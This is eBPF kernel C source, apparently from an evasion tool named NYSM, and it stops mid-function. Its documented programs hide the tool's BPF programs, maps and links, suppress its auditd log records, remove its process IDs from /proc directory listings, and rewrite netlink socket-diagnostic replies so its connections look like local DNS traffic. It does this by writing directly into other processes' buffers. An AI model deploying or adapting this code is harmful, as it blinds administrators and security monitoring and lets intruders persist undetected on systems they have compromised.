#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
// Kernel declared macros
#define BPF_PROG_GET_NEXT_ID        11 // bpf.h         https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/bpf.h#L878
#define BPF_MAP_GET_NEXT_ID         12 // bpf.h         https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/bpf.h#L879
#define BPF_LINK_GET_NEXT_ID        31 // bpf.h         https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/bpf.h#L898
#define DT_DIR                      4  // fs_types.h    https://elixir.bootlin.com/linux/v6.4/source/include/linux/fs_types.h#L37
#define NETLINK_SOCK_DIAG           4  // netlink.h     https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/netlink.h#L13
#define AF_NETLINK                  16 // socket.h      https://elixir.bootlin.com/linux/v6.4/source/include/linux/socket.h#L205
#define AF_INET                     2  // socket.h      https://elixir.bootlin.com/linux/v6.4/source/include/linux/socket.h#L191
#define SOCK_DIAG_BY_FAMILY         20 // sock_diag.h   https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/sock_diag.h#L7
#define TCP_ESTABLISHED             1  // tcp_states.h  https://elixir.bootlin.com/linux/v6.4/source/include/net/tcp_states.h#L13
#define TCP_CLOSE_WAIT              8  // tcp_states.h  https://elixir.bootlin.com/linux/v6.4/source/include/net/tcp_states.h#L20
#define TCP_LISTEN                  10 // tcp_states.h  https://elixir.bootlin.com/linux/v6.4/source/include/net/tcp_states.h#L22
// Self declared macros
#define AUDIT_LOG_SIZE              27  // referenced:  kprobe:audit_log_end, tracepoint:sys_exit_recvfrom
#define PID_MAX_SIZE                8   // referenced:  tracepoint:sys_exit_getdents64
#define DIRENT_BPF_LOOP             128 // referenced:  tracepoint:sys_exit_getdents64
#define RECVMSG_BPF_LOOP            128 // referenced:  tracepoint:sys_exit_recvmsg

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct exit_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    uint64_t ret;
};

struct enter_bpf_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    uint64_t cmd;
    uint64_t uattr;
    uint64_t size;
};

struct enter_recvfrom_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    uint64_t fd;
    uint64_t ubuf;
    uint64_t size;
    uint64_t flags;
    uint64_t addr;
    int32_t  addr_len;
};

struct enter_getdents64_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    uint64_t fd;
    uint64_t *dirent;
    uint64_t size;
};

struct enter_socket_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    int64_t  family;
    int64_t  type;
    int64_t  protocol;
};

struct enter_connect_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    int64_t  sockfd;
    uint64_t *addr;
    int64_t  addrlen;
};

struct enter_bind_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    int64_t  sockfd;
    uint64_t *addr;
    int64_t  addrlen;
};

struct enter_close_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    uint64_t  fd;
};

struct enter_recvmsg_format {
    unsigned long long h;
    uint32_t __syscall_nr;
    int64_t  fd;
    uint64_t *msg;
    uint64_t flags;
};

struct enter_audit_log_end_data {
    struct nlmsghdr nlh;
    char message[AUDIT_LOG_SIZE];
};

struct exit_getdents64_recursive_data {
    uint16_t d_reclen;
    uint64_t old_offset;
    uint64_t offset;
    uint64_t change_me;
};

struct enter_connect_bind_socket_data {
    uint16_t port;
    uint32_t addr;
};

struct inet_diag_msg { // https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/inet_diag.h#L117
    uint8_t  idiag_family;
    uint8_t  idiag_state;
    uint8_t  idiag_timer;
    uint8_t  idiag_retrans;
    // struct inet_diag_sockid https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/inet_diag.h#L14
    uint16_t idiag_sport;
    uint16_t idiag_dport;
    uint32_t idiag_src[4];
    uint32_t idiag_dst[4];
    uint32_t idiag_if;
    uint32_t idiag_cookie[2];

    uint32_t idiag_expires;
    uint32_t idiag_rqueue;
    uint32_t idiag_wqueue;
    uint32_t idiag_uid;
    uint32_t idiag_inode;
};

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(struct uattr_ptr *));
    __uint(max_entries, 1024);
} map_bpf_object_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_bpf_cmd_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_security_bpf_prog_id_data SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_security_bpf_map_id_data SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_bpf_link_prime_id_data SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   ,sizeof(uint32_t));
    __uint(value_size , sizeof(struct bpf_link_primer *));
    __uint(max_entries, 1024);
} map_bpf_link_prime_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(struct enter_audit_log_end_data));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_audit_log_end_msg_data SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint64_t));
    __uint(max_entries, 1024);
} map_recvfrom_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(struct linux_dirent64 *));
    __uint(max_entries, 1024);
} map_getdents64_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 4096);
} map_alloc_pid_pid_data SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key        , __u32);
    __type(value      , __u32);
} map_getdents64_recursive_tail_call SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(struct exit_getdents64_recursive_data));
    __uint(max_entries, 1024);
} map_getdents64_recursive_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_socket_pid SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(struct enter_connect_bind_socket_data));
    __uint(value_size , sizeof(uint32_t));
    __uint(max_entries, 1024);
} map_connect_bind_socket_data SEC(".maps");

struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(uint64_t));
    __uint(max_entries, 1024);
} map_recvmsg_pid SEC(".maps");

static int bpf_map_read_elem(void *dst, int size, void *map, int key) {
    void *ptr = 0;

    ptr = bpf_map_lookup_elem(map, &key);
    if (!ptr) return 1;
    bpf_probe_read(dst, size, ptr);

    return 0;
}

static uint32_t get_next_non_listed_id(void *map, uint32_t id) {

    if (!bpf_map_lookup_elem(map, &id)) return 0;
    for (int i=0;i<1024;i++) {
        id++;
        if (!bpf_map_lookup_elem(map, &id)) break;
    }

    return id;
}

static uint32_t bpf_get_ns(void) {
    struct  nsproxy       *nsproxy = 0;
    struct  pid_namespace *pid_ns  = 0;
    struct  ns_common     ns       = {};

    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    bpf_probe_read(&nsproxy, sizeof(nsproxy), &task->nsproxy);
    bpf_probe_read(&pid_ns , sizeof(pid_ns) , &nsproxy->pid_ns_for_children);
    bpf_probe_read(&ns     , sizeof(ns)     , &pid_ns->ns);

    return ns.inum;
}

static uint32_t atoi(unsigned char *string) {
    uint32_t number = 0,
             next   = 0;

    for (int i=0;i<PID_MAX_SIZE;i++) {
        if(string[i] == 0) break;
        next = string[i] - '0';
        if (next < 0 || next > 9) return 0;
        number = number * 10 + next;
    }

    return number;
}

uint64_t pidns;

/*
 *
 * Hide BPF programs, maps, and links.
 * |
 * |__ tracepoint:sys_enter_bpf
 * |   |__ Store PID of non-NYSM processes running bpf for map, link and program listing.
 * |__ tracepoint:sys_exit_bpf
 * |   |__ Hide NYSM bpf programs, maps, and links to non-NYSM processes.
 * |__ kprobe:security_bpf_prog
 * |   |__ Store new NYSM bpf programs ID.
 * |__ kprobe:security_bpf_map
 * |   |__ Store new NYSM bpf maps ID.
 * |__ kprobe:bpf_link_prime
 * |   |__ Store new NYSM bpf links primer buffer address.
 * |__ kretprobe:bpf_link_prime
 * |   |__ Store new NYSM bpf links ID from bpf_link_prime links primer buffer.
 * |__ kprobe:bpf_prog_put
 * |   |__ Clean programs ID from security_bpf_prog map.
 * |__ kprobe:bpf_map_put
 * |   |__ Clean maps ID from security_bpf_map map.
 * |__ kprobe:bpf_link_cleanup
 *     |__ Clean links ID from bpf_link_prime map.
 *
 */

SEC("tp/syscalls/sys_enter_bpf")
int tracepoint_bpf_enter(struct enter_bpf_format *ctx) {
    union bpf_attr *uattr_ptr = (void *) ctx->uattr;
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32,
             prog = BPF_PROG_GET_NEXT_ID,
             map  = BPF_MAP_GET_NEXT_ID,
             link = BPF_LINK_GET_NEXT_ID;

    if (bpf_get_ns() == pidns) return 0;

    switch (ctx->cmd) {
        case BPF_PROG_GET_NEXT_ID :
            bpf_map_update_elem(&map_bpf_cmd_pid, &tgid, &prog, BPF_ANY);
            break;
        case BPF_MAP_GET_NEXT_ID :
            bpf_map_update_elem(&map_bpf_cmd_pid, &tgid, &map , BPF_ANY);
            break;
        case BPF_LINK_GET_NEXT_ID :
            bpf_map_update_elem(&map_bpf_cmd_pid, &tgid, &link, BPF_ANY);
            break;
        default :
            return 0;
            break;
    }

    bpf_map_update_elem(&map_bpf_object_pid, &tgid, &uattr_ptr, BPF_ANY);

    return 0;
};

SEC("tp/syscalls/sys_exit_bpf")
int tracepoint_bpf_exit(void) {
    union bpf_attr *uattr_ptr = 0;
    union bpf_attr attr       = {};
    uint32_t tgid   = bpf_get_current_pid_tgid() >> 32,
             branch = 0,
             id     = 0;

    if (bpf_get_ns() == pidns) return 0;

    if (bpf_map_read_elem(&branch, sizeof(branch), &map_bpf_cmd_pid, tgid)) return 0;
    if (bpf_map_delete_elem(&map_bpf_cmd_pid, &tgid)) return 0;

    if (bpf_map_read_elem(&uattr_ptr, sizeof(uattr_ptr), &map_bpf_object_pid, tgid)) return 0;
    if (bpf_map_delete_elem(&map_bpf_object_pid, &tgid)) return 0;

    bpf_probe_read(&attr, sizeof(attr), uattr_ptr);

    switch (branch) {
        case BPF_PROG_GET_NEXT_ID :
            id = get_next_non_listed_id(&map_security_bpf_prog_id_data, attr.next_id);
            break;
        case BPF_MAP_GET_NEXT_ID :
            id = get_next_non_listed_id(&map_security_bpf_map_id_data , attr.next_id);
            break;
        case BPF_LINK_GET_NEXT_ID :
            id = get_next_non_listed_id(&map_bpf_link_prime_id_data   , attr.next_id);
            break;
        default :
            return 0;
            break;
    }

    if (!id) return 0;

    bpf_probe_write_user(&uattr_ptr->next_id, &id, sizeof(uint32_t));

    return 0;
};

SEC("kprobe/security_bpf_prog")
int BPF_KPROBE(security_bpf_prog, struct bpf_prog *prog) {
    struct  bpf_prog_aux *aux = 0;
    uint32_t bid  = 0;

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&aux, sizeof(aux), &prog->aux);
    bpf_probe_read(&bid, sizeof(bid), &aux->id);

    bpf_map_update_elem(&map_security_bpf_prog_id_data, &bid, &bid, BPF_ANY);

    return 0;
}

SEC("kprobe/security_bpf_map")
int BPF_KPROBE(security_bpf_map, struct bpf_map *map, fmode_t fmode) {
    uint32_t id = 0;

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&id, sizeof(id), &map->id);

    bpf_map_update_elem(&map_security_bpf_map_id_data, &id, &id, BPF_ANY);

    return 0;
}

SEC("kprobe/bpf_link_prime")
int BPF_KPROBE(bpf_link_prime, struct bpf_link *link, struct bpf_link_primer *primer) {
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32;

    if (bpf_get_ns() != pidns) return 0;

    bpf_map_update_elem(&map_bpf_link_prime_pid, &tgid, &primer, BPF_ANY);

    return 0;
}

SEC("kretprobe/bpf_link_prime")
int BPF_KRETPROBE(bpf_link_prime_exit, int ret) {
    struct bpf_link_primer *primer = 0;
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32,
             id   = 0;

    if (bpf_get_ns() != pidns) return 0;

    if (bpf_map_read_elem(&primer, sizeof(primer), &map_bpf_link_prime_pid, tgid)) return 0;
    if (bpf_map_delete_elem(&map_bpf_link_prime_pid, &tgid)) return 0;

    bpf_probe_read(&id, sizeof(id), &primer->id);

    bpf_map_update_elem(&map_bpf_link_prime_id_data, &id, &id, BPF_ANY);

    return 0;
}

SEC("kprobe/bpf_prog_put")
int BPF_KPROBE(bpf_prog_put, struct bpf_prog *prog) {
    struct  bpf_prog_aux *aux = 0;
    uint32_t bid = 0;

    bpf_probe_read(&aux, sizeof(aux), &prog->aux);
    bpf_probe_read(&bid, sizeof(bid), &aux->id);

    if (!bpf_map_lookup_elem(&map_security_bpf_prog_id_data, &bid)) return 0;
    if (bpf_map_delete_elem(&map_security_bpf_prog_id_data, &bid)) return 0;

    return 0;
}

SEC("kprobe/bpf_map_put")
int BPF_KPROBE(bpf_map_put, struct bpf_map *map) {
    uint32_t id = 0;

    bpf_probe_read(&id, sizeof(id), &map->id);

    if (!bpf_map_lookup_elem(&map_security_bpf_map_id_data, &id)) return 0;
    if (bpf_map_delete_elem(&map_security_bpf_map_id_data, &id)) return 0;

    return 0;
}

SEC("kprobe/bpf_link_cleanup")
int BPF_KPROBE(bpf_link_cleanup, struct bpf_link_primer *primer) {
    uint32_t id = 0;

    bpf_probe_read(&id, sizeof(id), &primer->id);

    if (!bpf_map_lookup_elem(&map_bpf_link_prime_id_data, &id)) return 0;
    if (bpf_map_delete_elem(&map_bpf_link_prime_id_data, &id)) return 0;

    return 0;
}

/*
 *
 * Hide NYSM programs Auditd generated logs.
 * |
 * |__ kprobe:audit_log_end
 * |   |__ Store message logs sent by NYSM programs.
 * |__ tracepoint:sys_enter_recvfrom
 * |   |__ Store non-NYSM output message logs buffer address.
 * |__ tracepoint:sys_exit_recvfrom
 *     |__ Hide audit_log_end message logs from sys_enter_recvfrom message logs output buffer.
 *
 */

SEC("kprobe/audit_log_end")
int BPF_KPROBE(audit_log_end, struct audit_buffer *ab) {
    struct sk_buff                  *skb      = 0;
    struct enter_audit_log_end_data audit_msg = {};
    void     *head   = 0,
             *ptr    = 0;
    uint32_t skb_len = 0,
             count   = 0;

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&skb              , sizeof(skb)              , &ab->skb);
    bpf_probe_read(&head             , sizeof(head)             , &skb->head);
    bpf_probe_read(&skb_len          , sizeof(skb_len)          , &skb->len);
    bpf_probe_read(&audit_msg.nlh    , sizeof(audit_msg.nlh)    , head);
    bpf_probe_read(&audit_msg.message, sizeof(audit_msg.message), head+offsetof(struct enter_audit_log_end_data, message));

    audit_msg.nlh.nlmsg_len = skb_len-sizeof(struct nlmsghdr);

    ptr = bpf_map_lookup_elem(&map_audit_log_end_msg_data, &audit_msg);
    if (ptr) {
        bpf_probe_read(&count, sizeof(count), ptr);
        count++;
    }

    bpf_map_update_elem(&map_audit_log_end_msg_data, &audit_msg, &count, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_recvfrom")
int tracepoint_recvfrom_enter(struct enter_recvfrom_format *ctx) {
    void     *ubuf = (void *)ctx->ubuf;
    uint32_t tgid  = bpf_get_current_pid_tgid() >> 32;

    if (bpf_get_ns() == pidns) return 0;

    bpf_map_update_elem(&map_recvfrom_pid, &tgid, &ubuf, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_recvfrom")
int tracepoint_recvfrom_exit(void) {
    struct enter_audit_log_end_data audit_msg = {};
    void     *ubuf = 0,
             *ptr  = 0;
    uint32_t tgid  = bpf_get_current_pid_tgid() >> 32,
             count = 0,
             zero  = 0;

    if (bpf_get_ns() == pidns) return 0;

    if (bpf_map_read_elem(&ubuf, sizeof(ubuf), &map_recvfrom_pid, tgid)) return 0;
    if (bpf_map_delete_elem(&map_recvfrom_pid, &tgid)) return 0;

    bpf_probe_read(&audit_msg.nlh    , sizeof(audit_msg.nlh)    , ubuf);
    bpf_probe_read(&audit_msg.message, sizeof(audit_msg.message), ubuf+offsetof(struct enter_audit_log_end_data, message));

    ptr = bpf_map_lookup_elem(&map_audit_log_end_msg_data, &audit_msg);
    if (!ptr) return 0;
    bpf_probe_read(&count, sizeof(count), ptr);

    if (count == 0) {
        if (bpf_map_delete_elem(&map_audit_log_end_msg_data, &audit_msg)) return 0;
    }
    else {
        count--;
        bpf_map_update_elem(&map_audit_log_end_msg_data, &audit_msg, &count, BPF_ANY);
    }

    bpf_probe_write_user(ubuf, &zero, sizeof(zero));

    return 0;
}

/*
 *
 * Hide new NYSM programs PID.
 * |
 * |__ kretprobe:alloc_pid
 * |   |__ Store new NYSM programs PID.
 * |__ kprobe:free_pid
 * |   |__ Clean PID from alloc_pid map.
 * |__ tracepoint:sys_enter_getdents64
 * |   |__ Store non-NYSM programs directory entries output buffer address.
 * |__ tracepoint:sys_exit_getdents64
 *     |__ Hide alloc_pid PID from sys_enter_getdents64 directory entries output buffer
 *
 */

SEC("kretprobe/alloc_pid")
int BPF_KRETPROBE(alloc_pid_exit, void *ret_pid) {
    struct upid numbers = {};

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&numbers, sizeof(numbers), ret_pid+offsetof(struct pid, numbers));

    bpf_map_update_elem(&map_alloc_pid_pid_data, &numbers.nr, &numbers.nr, BPF_ANY);

    return 0;
}

SEC("kprobe/free_pid")
int BPF_KPROBE(free_pid, struct pid *pid) {
    struct upid numbers = {};

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&numbers, sizeof(numbers), pid->numbers);

    if (!bpf_map_lookup_elem(&map_alloc_pid_pid_data, &numbers.nr)) return 0;
    if (bpf_map_delete_elem(&map_alloc_pid_pid_data, &numbers.nr)) return 0;

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_getdents64")
int tracepoint_getdents64_enter(struct enter_getdents64_format *ctx) {
    struct task_struct  *task   = (struct task_struct *)bpf_get_current_task();
    struct files_struct *files  = 0;
    struct fdtable      *fdt    = 0;
    struct file         **fd    = 0;
    struct file         *f      = 0;
    struct dentry       *dentry = 0;
    struct qstr         d_name  = {};
    void     *dirent = ctx->dirent;
    uint32_t tgid    = bpf_get_current_pid_tgid() >> 32;
    uint8_t  name    = 0;

    if (bpf_get_ns() == pidns) return 0;

    bpf_probe_read(&files , sizeof(files) , &task->files);
    bpf_probe_read(&fdt   , sizeof(fdt)   , &files->fdt);
    bpf_probe_read(&fd    , sizeof(fd)    , &fdt->fd);
    bpf_probe_read(&f     , sizeof(f)     , &fd[ctx->fd]);
    bpf_probe_read(&dentry, sizeof(dentry), &f->f_path.dentry);
    bpf_probe_read(&d_name, sizeof(d_name), &dentry->d_name);
    bpf_probe_read(&name  , sizeof(name)  , d_name.name);

    if (name != '/') return 0;

    bpf_map_update_elem(&map_getdents64_pid, &tgid, &dirent, BPF_ANY);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int tracepoint_getdents64_exit(struct exit_format *ctx) {
    struct linux_dirent64            dirent      = {};
    struct exit_getdents64_recursive_data data        = {
        .d_reclen   = 0,
        .old_offset = 0,
        .offset     = 0,
        .change_me  = 0
    };
    void     *dirent_ptr          = 0;
    uint64_t ret                  = ctx->ret;
    uint32_t tgid                 = bpf_get_current_pid_tgid() >> 32,
             pid                  = 0;
    uint8_t  d_name[PID_MAX_SIZE] = {},
             d_type               = 0;

    if (bpf_get_ns() == pidns) return 0;

    if (!bpf_map_lookup_elem(&map_getdents64_recursive_pid, &tgid)) {
        bpf_map_update_elem(&map_getdents64_recursive_pid, &tgid, &data, BPF_ANY);
    }
    if (bpf_map_read_elem(&data, sizeof(data), &map_getdents64_recursive_pid, tgid)) return 0;

    if (bpf_map_read_elem(&dirent_ptr, sizeof(dirent_ptr), &map_getdents64_pid, tgid)) return 0;

    for (int i=0;i<DIRENT_BPF_LOOP;i++) {
        bpf_probe_read(&dirent, sizeof(dirent), dirent_ptr+data.offset);
        bpf_probe_read(&d_name, sizeof(d_name), ((struct linux_dirent64 *)(dirent_ptr+data.offset))->d_name);
        bpf_probe_read(&d_type, sizeof(d_type), &((struct linux_dirent64 *)(dirent_ptr+data.offset))->d_type);

        pid = atoi(d_name);

        if (bpf_map_lookup_elem(&map_alloc_pid_pid_data, &pid)) {
            if (!data.d_reclen) {
                data.d_reclen  = (data.offset-data.old_offset)+dirent.d_reclen;
                data.change_me = data.old_offset;
            }
            else {
                data.d_reclen += dirent.d_reclen;
            }
        }
        else if (data.d_reclen && data.change_me && d_type == DT_DIR) {
            bpf_probe_write_user(&((struct linux_dirent64 *)(dirent_ptr+data.change_me))->d_reclen, &data.d_reclen, sizeof(data.d_reclen));
            data.d_reclen  = 0;
            data.change_me = 0;
        }

        data.old_offset = data.offset;
        data.offset += dirent.d_reclen;

        if (data.offset >= ret) break;
    }

    bpf_map_update_elem(&map_getdents64_recursive_pid, &tgid, &data, BPF_ANY);

    if (data.offset < ret) bpf_tail_call(ctx, &map_getdents64_recursive_tail_call, 1);

    if (bpf_map_delete_elem(&map_getdents64_pid, &tgid)) return 0;
    if (bpf_map_delete_elem(&map_getdents64_recursive_pid, &tgid)) return 0;

    return 0;
}

/*
 *
 * Hide NETLINK_SOCK_DIAG AF_NETLINK socket result.
 * |
 * |__ tracepoint:sys_enter_socket
 * |   |__ Store PID of non-NYSM processes running socket(AF_NETLINK, .., NETLINK_SOCK_DIAG).
 * |__ tracepoint:sys_enter_connect
 * |   |__ Store port and address of NYSM processes connections.
 * |__ tracepoint:sys_enter_bind
 * |   |__ Store port and address of NYSM processes bindings.
 * |__ tracepoint:sys_enter_recvmsg
 * |   |__ Store recvmsg output buffer address if the PID is the same as sys_enter_socket.
 * |__ tracepoint:sys_exit_recvmsg
 *     |__ Hide NYSM processes connections and bindings from sys_enter_recvmsg output buffer.
 *
 */

SEC("tp/syscalls/sys_enter_socket")
int tracepoint_socket_enter(struct enter_socket_format *ctx) {
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32;

    if (bpf_get_ns() == pidns) return 0;

    if (ctx->family != AF_NETLINK || ctx->protocol != NETLINK_SOCK_DIAG) return 0;

    if (!bpf_map_lookup_elem(&map_socket_pid, &tgid)) {
        bpf_map_update_elem(&map_socket_pid, &tgid, &tgid, BPF_ANY);
    }

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_connect")
int tracepoint_connect_enter(struct enter_connect_format *ctx) {
    struct sockaddr_in                    addr      = {};
    struct enter_connect_bind_socket_data sock_name = {};
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32;

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&addr, sizeof(addr), ctx->addr);
    if (addr.sin_family != AF_INET) return 0;

    sock_name.port = addr.sin_port;
    sock_name.addr = addr.sin_addr.s_addr;

    if (!bpf_map_lookup_elem(&map_connect_bind_socket_data, &sock_name)) {
        bpf_map_update_elem(&map_connect_bind_socket_data, &sock_name, &tgid, BPF_ANY);
    }

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_bind")
int tracepoint_bind_enter(struct enter_bind_format *ctx) {
    struct sockaddr_in                    addr      = {};
    struct enter_connect_bind_socket_data sock_name = {};
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32;

    if (bpf_get_ns() != pidns) return 0;

    bpf_probe_read(&addr, sizeof(addr), ctx->addr);
    if (addr.sin_family != AF_INET) return 0;

    sock_name.port = addr.sin_port;
    sock_name.addr = addr.sin_addr.s_addr;

    if (!bpf_map_lookup_elem(&map_connect_bind_socket_data, &sock_name)) {
        bpf_map_update_elem(&map_connect_bind_socket_data, &sock_name, &tgid, BPF_ANY);
    }

    if (!bpf_map_lookup_elem(&map_connect_bind_socket_data, &sock_name)) return 0;

    return 0;
}

SEC("tp/syscalls/sys_enter_recvmsg")
int tracepoint_recvmsg_enter(struct enter_recvmsg_format *ctx) {
    struct user_msghdr msg      = {};
    struct sockaddr_nl msg_name = {};
    struct iovec       msg_iov  = {};
    uint32_t tgid = bpf_get_current_pid_tgid() >> 32;

    if (bpf_get_ns() == pidns) return 0;

    if (!bpf_map_lookup_elem(&map_socket_pid, &tgid)) return 0;

    bpf_probe_read(&msg, sizeof(msg), ctx->msg);
    if (msg.msg_namelen != 12) return 0;

    bpf_probe_read(&msg_name, sizeof(msg_name), msg.msg_name);
    if (msg_name.nl_family != AF_NETLINK) return 0;

    bpf_probe_read(&msg_iov, sizeof(msg_iov), msg.msg_iov);

    bpf_map_update_elem(&map_recvmsg_pid, &tgid, &msg_iov.iov_base, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_recvmsg")
int tracepoint_recvmsg_exit(struct exit_format *ctx) {
    struct nlmsghdr                        msghdr        = {};
    struct enter_connect_bind_socket_data  sock_name_src = {},
                                           sock_name_dst = {};
    void     *iov_base    = 0;
    uint32_t tgid         = bpf_get_current_pid_tgid() >> 32,
             idiag_src    = 0,
             idiag_dst    = 0,
             idiag_if     = 0,
             idiag_wqueue = 0,
             offset       = 0,
             last_offest  = 0,
             last_msglen  = 0,
             new_msglen   = 0,
             change_me    = 0;
    uint16_t idiag_sport  = 0,
             idiag_dport  = 0;
    uint8_t  idiag_family = 0,
             idiag_state  = 0;

    if (bpf_get_ns() == pidns) return 0;

    if (!bpf_map_lookup_elem(&map_socket_pid, &tgid)) return 0;

    if (bpf_map_read_elem(&iov_base, sizeof(iov_base), &map_recvmsg_pid, tgid)) return 0;
    if (bpf_map_delete_elem(&map_recvmsg_pid, &tgid)) return 0;

    for (int i=0;i<RECVMSG_BPF_LOOP;i++) {
        bpf_probe_read(&msghdr, sizeof(msghdr), iov_base+offset);

        if (msghdr.nlmsg_len == 0) {
            if (change_me || new_msglen) {
                bpf_probe_write_user(iov_base+change_me+offsetof(struct nlmsghdr, nlmsg_len), &new_msglen, sizeof(uint32_t));
            }
            return 0;
        };
        if (msghdr.nlmsg_type != SOCK_DIAG_BY_FAMILY) return 0;

        bpf_probe_read(&idiag_family, sizeof(idiag_family), iov_base+offset+sizeof(msghdr));
        if (idiag_family != AF_INET) return 0;

        bpf_probe_read(&idiag_sport, sizeof(idiag_sport), iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_sport));
        bpf_probe_read(&idiag_dport, sizeof(idiag_dport), iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_dport));
        bpf_probe_read(&idiag_src  , sizeof(idiag_src)  , iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_src));
        bpf_probe_read(&idiag_dst  , sizeof(idiag_dst)  , iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_dst));

        sock_name_dst.port = idiag_dport;
        sock_name_dst.addr = idiag_dst;
        sock_name_src.port = idiag_sport;
        sock_name_src.addr = idiag_src;

        if (bpf_map_lookup_elem(&map_connect_bind_socket_data, &sock_name_dst) || bpf_map_lookup_elem(&map_connect_bind_socket_data, &sock_name_src)) {
            if (i == 0) {
                bpf_probe_read(&idiag_state, sizeof(idiag_dport), iov_base+offset+sizeof(msghdr)+sizeof(uint8_t));
                switch (idiag_state) {
                    case TCP_ESTABLISHED:
                    case TCP_CLOSE_WAIT:
                        idiag_sport  = 13568;     // 53
                        idiag_dport  = 13568;     // 53
                        idiag_src    = 16777343;  // 127.0.0.1
                        idiag_dst    = 889192575; // 127.0.0.53
                        idiag_if     = 1;
                        idiag_wqueue = 0;
                        break;
                    case TCP_LISTEN:
                        idiag_sport  = 13568;     // 53
                        idiag_dport  = 0;         // *
                        idiag_src    = 889192575; // 127.0.0.53
                        idiag_dst    = 0;         // 0.0.0.0
                        idiag_if     = 1;         // /sys/class/net/lo/ifindex
                        idiag_wqueue = 4096;
                        break;
                    default:
                        break;
                }
                bpf_probe_write_user(iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_sport) , &idiag_sport , sizeof(uint16_t));
                bpf_probe_write_user(iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_dport) , &idiag_dport , sizeof(uint16_t));
                bpf_probe_write_user(iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_src)   , &idiag_src   , sizeof(uint32_t));
                bpf_probe_write_user(iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_dst)   , &idiag_dst   , sizeof(uint32_t));
                bpf_probe_write_user(iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_if)    , &idiag_if    , sizeof(uint32_t));
